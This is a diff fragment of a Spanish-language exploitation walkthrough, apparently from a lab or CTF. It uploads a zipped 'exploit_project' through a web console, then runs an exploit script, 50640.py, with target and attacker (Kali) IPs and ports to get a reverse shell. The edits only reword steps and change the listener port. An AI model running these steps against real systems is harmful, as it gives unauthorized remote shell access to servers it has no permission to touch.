@@ -43,13 +43,13 @@ EOF
 ❯ zip -r exploit_project.zip exploit_project
 
 Paso 2:
-En la consola ir a 'Projects' dar click en 'Create > Upload (seleccionar archivo .zip) > Finish'
+En la consola web ir a 'Projects' dar click en 'Create > Upload (seleccionar archivo .zip creado) > Finish'
 ```
 
 ```bash 
 Paso 3:
 # Ejecutar el exploit para obtener la revershell 
-❯ python3 50640.py -t IP_Server -p 8000 -L IP_Kali -P 9001      
+❯ python3 50640.py -t IP_Server -p 8000 -L IP_Kali -P 4444    
 
 NOTA:
 	- Se necesitan las creds para la autenticación y que exista un projecto
